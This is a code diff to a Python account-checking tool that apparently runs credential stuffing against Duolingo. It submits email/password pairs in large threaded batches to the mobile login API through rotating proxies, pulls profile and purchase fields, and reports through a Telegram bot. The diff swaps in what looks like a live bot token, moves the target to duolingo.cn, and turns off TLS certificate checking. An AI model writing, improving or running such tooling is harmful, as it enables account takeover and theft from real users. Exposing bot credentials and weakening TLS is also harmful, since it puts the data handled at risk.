@@ -14,7 +14,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import traceback
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = "8192096605:AAEmxFRw8jLpGXb5_LVFFvIVjvpvs6C28ik"
+BOT_TOKEN = "8508134526:AAFMGnfAkoja2ybfxQmA7WI73Og3bSjETW0"
 ADMIN_IDS = [7049509075,1832003738]
 MAX_THREADS = 50
 BATCH_SIZE = 10000
@@ -146,7 +146,8 @@ def get_proxy_url(proxy_entry):
     if len(parts) == 4:
         host, port, user, passwd = parts
         if ptype in ("SOCKS4", "SOCKS5"):
-            scheme = "socks4" if ptype == "SOCKS4" else "socks5"
+            # socks5h:// routes DNS through the proxy (required for .cn domains)
+            scheme = "socks4a" if ptype == "SOCKS4" else "socks5h"
             return f"{scheme}://{user}:{passwd}@{host}:{port}"
         else:
             scheme = "https" if ptype == "HTTPS" else "http"
@@ -154,7 +155,7 @@ def get_proxy_url(proxy_entry):
     elif len(parts) == 2:
         host, port = parts
         if ptype in ("SOCKS4", "SOCKS5"):
-            scheme = "socks4" if ptype == "SOCKS4" else "socks5"
+            scheme = "socks4a" if ptype == "SOCKS4" else "socks5h"
             return f"{scheme}://{host}:{port}"
         else:
             scheme = "https" if ptype == "HTTPS" else "http"
@@ -198,6 +199,35 @@ def test_one_proxy(entry, timeout=12):
 
 
 
+import ssl as _ssl
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+class _TLSAdapter(HTTPAdapter):
+    """Fix SSL errors (TLSV1_ALERT_DECODE_ERROR / UNEXPECTED_EOF) caused by Geonode proxy + OpenSSL 3."""
+    def _make_ssl_context(self):
+        try:
+            from urllib3.util.ssl_ import create_urllib3_context
+            ctx = create_urllib3_context()
+            ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
+            ctx.check_hostname = False
+            ctx.verify_mode = _ssl.CERT_NONE
+            return ctx
+        except Exception:
+            return None
+
+    def init_poolmanager(self, *args, **kwargs):
+        ctx = self._make_ssl_context()
+        if ctx:
+            kwargs["ssl_context"] = ctx
+        super().init_poolmanager(*args, **kwargs)
+
+    def proxy_manager_for(self, proxy, **proxy_kwargs):
+        ctx = self._make_ssl_context()
+        if ctx:
+            proxy_kwargs["ssl_context"] = ctx
+        return super().proxy_manager_for(proxy, **proxy_kwargs)
+
 def create_session():
     session = requests.Session()
     retry_strategy = Retry(
@@ -206,9 +236,10 @@ def create_session():
         status_forcelist=[429, 500, 502, 503, 504],
         allowed_methods=["GET", "POST"]
     )
-    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
+    adapter = _TLSAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
     session.mount("https://", adapter)
     session.mount("http://", adapter)
+    session.verify = False  # Fix SSL errors when routing through Geonode proxy
     # Apply random proxy if available + remember which one was used
     session._proxy_label = None
     proxy_info = get_random_proxy()
@@ -232,7 +263,7 @@ def get_headers(ua, jwt=None):
         "Pragma": "no-cache",
         "Accept-Encoding": "gzip",
         "Accept-Language": "en-US,en;q=0.8",
-        "Host": "android-api.duolingo.com",
+        "Host": "android-api.duolingo.cn",
         "X-Amzn-Trace-Id": "User=0"
     }
     if jwt:
@@ -626,7 +657,7 @@ def check_single_account(email, password):
 
     for attempt in range(MAX_RETRIES):
         try:
-            login_url = "https://android-api.duolingo.com/2017-06-30/login?fields=id"
+            login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
             login_payload = {
                 "distinctId": str(uuid.uuid4()),
                 "identifier": email,
@@ -665,7 +696,7 @@ def check_single_account(email, password):
                 "purchasePrice", "currentCourseId"
             ]
             profile_url = (
-                f"https://android-api.duolingo.com/2023-05-23/users/{user_id}"
+                f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}"
                 f"?fields={','.join(fields)}"
             )
 
